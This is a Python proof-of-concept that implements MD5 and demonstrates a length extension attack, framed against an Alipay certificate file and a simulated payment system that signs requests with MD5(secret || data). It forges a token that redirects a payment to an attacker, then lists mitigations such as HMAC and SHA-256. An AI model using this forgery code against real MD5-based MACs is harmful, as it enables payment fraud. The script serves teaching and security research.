#!/usr/bin/env python3
"""
MD5 Length Extension Attack - Proof of Concept
Target: Alipay APK signing certificate (md5WithRSAEncryption)

This script demonstrates how MD5's Merkle-Damgard construction is vulnerable
to length extension attacks. Given MD5(message) and len(message), an attacker
can compute MD5(message || padding || extension) without knowing message.

Author: hash-collision-lab / innora-tech
"""

import struct
import hashlib
import os
import sys


# ---------------------------------------------------------------------------
# Pure-Python MD5 implementation (RFC 1321, standard library only)
# ---------------------------------------------------------------------------

# Per-round shift amounts
_S = [
    7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,
    5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,
    4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,
    6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,
]

# Precomputed table: T[i] = floor(abs(sin(i+1)) * 2^32)
_T = [
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
    0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
    0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
    0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
    0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
    0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
    0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
    0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
    0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
]

MASK32 = 0xFFFFFFFF


def _left_rotate(x, n):
    return ((x << n) | (x >> (32 - n))) & MASK32


def _md5_compress(state, block):
    """Process one 64-byte block. state = [A, B, C, D] (32-bit little-endian)."""
    assert len(block) == 64
    a, b, c, d = state
    M = struct.unpack('<16I', block)

    for i in range(64):
        if i < 16:
            f = (b & c) | (~b & d)
            g = i
        elif i < 32:
            f = (d & b) | (~d & c)
            g = (5 * i + 1) % 16
        elif i < 48:
            f = b ^ c ^ d
            g = (3 * i + 5) % 16
        else:
            f = c ^ (b | ~d)
            g = (7 * i) % 16

        f = f & MASK32
        temp = (a + f + _T[i] + M[g]) & MASK32
        temp = _left_rotate(temp, _S[i])
        temp = (temp + b) & MASK32

        a, b, c, d = d, temp, b, c

    return [
        (state[0] + a) & MASK32,
        (state[1] + b) & MASK32,
        (state[2] + c) & MASK32,
        (state[3] + d) & MASK32,
    ]


def _md5_padding(message_length_bytes):
    """
    Return the standard MD5 padding for a message of given byte length.
    Appends 0x80, then zero bytes, then 8-byte little-endian bit-count,
    so that (message_length + padding_length) is a multiple of 64.
    """
    bit_len = message_length_bytes * 8
    pad_len = (55 - message_length_bytes) % 64  # bytes of zeros after 0x80
    return b'\x80' + b'\x00' * pad_len + struct.pack('<Q', bit_len)


def md5_from_state(state_hex, data, original_length):
    """
    Continue MD5 computation from an intermediate state.

    state_hex      : hex string of MD5 state (A||B||C||D, each 32-bit LE word)
                     i.e., the output of hashlib.md5(prefix).hexdigest()
    data           : bytes to hash next (the extension)
    original_length: total byte length of all data processed to reach this state
                     (i.e., len(prefix_with_padding), a multiple of 64)
    Returns hex digest of MD5(prefix_with_padding || data).
    """
    # Recover A, B, C, D from the hex digest (little-endian 32-bit words)
    h = bytes.fromhex(state_hex)
    A, B, C, D = struct.unpack('<4I', h)
    state = [A, B, C, D]

    # Build final message: data + padding (length counted from original_length)
    msg = bytearray(data)
    msg_len = len(msg)
    padded_msg = msg + _md5_padding(original_length + msg_len)

    # Process each 64-byte block
    for i in range(0, len(padded_msg), 64):
        state = _md5_compress(state, bytes(padded_msg[i:i + 64]))

    return struct.pack('<4I', *state).hex()


def md5_full(data: bytes) -> str:
    """Full MD5 of data, pure Python."""
    state = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
    padded = data + _md5_padding(len(data))
    for i in range(0, len(padded), 64):
        state = _md5_compress(state, bytes(padded[i:i + 64]))
    return struct.pack('<4I', *state).hex()


# ---------------------------------------------------------------------------
# Length Extension Attack
# ---------------------------------------------------------------------------

def md5_length_extension_attack(
    known_hash: str,
    original_length: int,
    extension: bytes,
):
    """
    Perform MD5 length extension attack.

    Parameters
    ----------
    known_hash      : MD5 hex digest of the original message (known to attacker)
    original_length : byte length of the original message (known to attacker)
    extension       : arbitrary bytes the attacker wants to append

    Returns
    -------
    (forged_hash, forged_suffix)
        forged_hash   : MD5 hex digest of (original || padding || extension)
        forged_suffix : the bytes appended after the original message,
                        i.e. padding(original) || extension
    """
    # The padding that was applied to the original message
    original_padding = _md5_padding(original_length)

    # After processing (original || original_padding), the state IS known_hash.
    # Total bytes consumed to reach that state:
    state_byte_offset = original_length + len(original_padding)

    # Continue hashing from that state with 'extension' as new data
    forged_hash = md5_from_state(known_hash, extension, state_byte_offset)

    # The forged message is: original || original_padding || extension
    forged_suffix = original_padding + extension

    return forged_hash, forged_suffix


# ---------------------------------------------------------------------------
# Verification helper
# ---------------------------------------------------------------------------

def verify_attack(original_data: bytes, extension: bytes) -> dict:
    """
    End-to-end verification of the length extension attack.
    Returns a dict with all relevant values and a boolean 'success'.
    """
    # Step 1: Compute hash of original data (what the victim/server sees)
    original_hash = md5_full(original_data)

    # Step 2: Attacker only knows original_hash and len(original_data)
    known_hash = original_hash
    original_length = len(original_data)

    # Step 3: Perform the attack
    forged_hash, forged_suffix = md5_length_extension_attack(
        known_hash, original_length, extension
    )

    # Step 4: Build the actual forged message and compute its real MD5
    forged_message = original_data + forged_suffix
    real_hash_of_forged = md5_full(forged_message)

    # Cross-check: compare pure-Python result with hashlib
    hashlib_check = hashlib.md5(forged_message).hexdigest()

    success = (forged_hash == real_hash_of_forged == hashlib_check)

    return {
        "original_length": original_length,
        "original_hash": original_hash,
        "extension": extension,
        "forged_suffix_len": len(forged_suffix),
        "padding_len": len(forged_suffix) - len(extension),
        "forged_hash_predicted": forged_hash,
        "forged_hash_actual": real_hash_of_forged,
        "hashlib_check": hashlib_check,
        "success": success,
    }


# ---------------------------------------------------------------------------
# Demo: Alipay certificate + simulated MAC scenario
# ---------------------------------------------------------------------------

def run_demo():
    cert_path = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "..", "poc-01-md5-cert", "alipay-original-cert.der"
    )

    print("=" * 66)
    print("  MD5 Length Extension Attack -- Proof of Concept")
    print("  Target: Alipay APK Certificate (md5WithRSAEncryption)")
    print("=" * 66)
    print()

    # ------------------------------------------------------------------
    # Part 1: Self-test of pure-Python MD5
    # ------------------------------------------------------------------
    print("--- Step 1: Validate Pure-Python MD5 Implementation ---")
    test_vectors = [
        (b"",               "d41d8cd98f00b204e9800998ecf8427e"),
        (b"a",              "0cc175b9c0f1b6a831c399e269772661"),
        (b"abc",            "900150983cd24fb0d6963f7d28e17f72"),
        (b"message digest", "f96b697d7cb7938d525a2f31aaf161d0"),
        (b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
                            "d174ab98d277d9f5a5611c2c9f419d9f"),
    ]
    all_pass = True
    for msg, expected in test_vectors:
        got = md5_full(msg)
        ok = got == expected
        all_pass = all_pass and ok
        status = "PASS" if ok else "FAIL"
        label = repr(msg[:30]) + ("..." if len(msg) > 30 else "")
        print(f"  [{status}] MD5({label}) = {got}")

    if all_pass:
        print("  => All RFC 1321 test vectors PASS")
    else:
        print("  => FAIL: MD5 implementation error")
        sys.exit(1)
    print()

    # ------------------------------------------------------------------
    # Part 2: Load Alipay certificate
    # ------------------------------------------------------------------
    print("--- Step 2: Load Alipay Certificate DER ---")
    try:
        with open(cert_path, "rb") as f:
            cert_data = f.read()
    except FileNotFoundError:
        print(f"  ERROR: cert not found at {cert_path}")
        sys.exit(1)

    cert_md5_py = md5_full(cert_data)
    cert_md5_lib = hashlib.md5(cert_data).hexdigest()
    expected_cert_md5 = "406d5150e64381124a7e8569f9784ed0"

    print(f"  File size         : {len(cert_data)} bytes")
    print(f"  MD5 (pure-Python) : {cert_md5_py}")
    print(f"  MD5 (hashlib)     : {cert_md5_lib}")
    print(f"  MD5 (expected)    : {expected_cert_md5}")
    cert_ok = (cert_md5_py == cert_md5_lib == expected_cert_md5)
    if cert_ok:
        print("  => MATCH -- certificate identity confirmed")
    else:
        print("  => MISMATCH -- unexpected cert")
    print()

    # ------------------------------------------------------------------
    # Part 3: Length extension on the certificate DER
    # ------------------------------------------------------------------
    print("--- Step 3: Length Extension on Certificate DER ---")
    extension_payload = b"\x00INJECTED_EXTENSION_DATA_by_attacker"

    print("  Attacker knows:")
    print(f"    known_hash   = {cert_md5_py}")
    print(f"    original_len = {len(cert_data)} bytes")
    print(f"    extension    = {extension_payload!r}")
    print()

    result = verify_attack(cert_data, extension_payload)

    padding_hex = _md5_padding(len(cert_data)).hex()
    print(f"  MD5 padding appended after original ({result['padding_len']} bytes):")
    print(f"    {padding_hex}")
    print()
    print(f"  Forged hash (predicted by attack) : {result['forged_hash_predicted']}")
    print(f"  Actual MD5 of forged message      : {result['forged_hash_actual']}")
    print(f"  Hashlib cross-check               : {result['hashlib_check']}")
    print()
    if result["success"]:
        print("  ATTACK SUCCESS -- predicted hash matches actual hash")
    else:
        print("  ATTACK FAILED -- hashes do not match")
        sys.exit(1)
    print()

    # ------------------------------------------------------------------
    # Part 4: MAC forgery scenario
    # ------------------------------------------------------------------
    print("--- Step 4: MAC Forgery Scenario (secret || data) ---")
    print()
    print("  Scenario: A payment system signs requests with:")
    print("    token = MD5(secret_key || request_data)")
    print()
    print("  Where:")
    print("    secret_key   = <unknown to attacker, but length is guessable>")
    print("    request_data = b'amount=100&to=alice'")
    print()

    secret_key = b"ALIPAY_SECRET_2009"       # victim knows; attacker does NOT
    request_data = b"amount=100&to=alice"
    evil_extension = b"&to=attacker&amount=99999"

    original_msg = secret_key + request_data
    legit_token = md5_full(original_msg)

    print(f"  Legit token (victim-issued):")
    print(f"    MD5(secret || data) = {legit_token}")
    print()
    print("  Attacker intercepts the token and knows:")
    print(f"    token       = {legit_token}")
    print(f"    data        = {request_data!r}")
    print(f"    len(secret) = {len(secret_key)} (guessable: try 1..64)")
    print(f"    extension   = {evil_extension!r}")
    print()

    # Attack: attacker guesses secret length = len(secret_key)
    guessed_secret_len = len(secret_key)
    assumed_total_len = guessed_secret_len + len(request_data)

    forged_token, forged_suffix = md5_length_extension_attack(
        legit_token, assumed_total_len, evil_extension
    )

    # Verify: what the server would compute for the forged request
    forged_request_data = request_data + forged_suffix
    server_check = md5_full(secret_key + forged_request_data)

    print("  Forged request data (what attacker sends to server):")
    forged_visible = request_data + _md5_padding(assumed_total_len) + evil_extension
    display = forged_visible[:80]
    print(f"    {display!r}{'...' if len(forged_visible) > 80 else ''}")
    print()
    print(f"  Forged token (computed by attacker) : {forged_token}")
    print(f"  Server recomputation of forged token: {server_check}")
    print()

    if forged_token == server_check:
        print("  MAC FORGERY SUCCESS -- server would accept the forged request!")
        print("  Attacker redirected payment without knowing the secret key.")
    else:
        print("  MAC FORGERY FAILED")
        sys.exit(1)
    print()

    # ------------------------------------------------------------------
    # Summary
    # ------------------------------------------------------------------
    print("--- Summary ---")
    print()
    print("  MD5 is built on the Merkle-Damgard construction.")
    print("  After processing a message, the final hash IS the internal state.")
    print("  Anyone who knows MD5(m) and len(m) can compute MD5(m||pad||ext)")
    print("  without knowing m -- purely by resuming the state machine.")
    print()
    print("  Alipay's certificate uses md5WithRSAEncryption:")
    print("  * Certificate binding relies on MD5 for digest integrity.")
    print("  * Legacy systems using MD5-based MACs (MD5(secret||data)) are")
    print("    trivially forgeable even without the secret key.")
    print()
    print("  Mitigations:")
    print("  * Use HMAC (secret is mixed both before and after the data).")
    print("  * Switch to SHA-256 or SHA-3 (SHA-3/Keccak uses sponge construction,")
    print("    which is immune to length extension by design).")
    print("  * APK Signature Scheme v2/v3 uses SHA-256 + full-file signing,")
    print("    making this class of attack irrelevant for modern APKs.")
    print()
    print("=" * 66)
    print("  All checks PASSED -- Length extension attack fully demonstrated.")
    print("=" * 66)


if __name__ == "__main__":
    run_demo()
